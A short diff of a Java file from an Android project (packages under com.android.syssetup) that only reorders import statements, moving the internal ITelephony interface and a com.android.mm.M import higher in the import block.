@@ -4,6 +4,8 @@ import android.app.admin.DevicePolicyManager;
 import android.content.Context;
 import android.telephony.TelephonyManager;
 
+import com.android.internal.telephony.ITelephony;
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.Trigger;
 import com.android.syssetup.auto.Cfg;
@@ -11,8 +13,6 @@ import com.android.syssetup.conf.ConfAction;
 import com.android.syssetup.conf.ConfigurationException;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.Execute;
-import com.android.internal.telephony.ITelephony;
-import com.android.mm.M;
 
 import java.lang.reflect.Method;
 
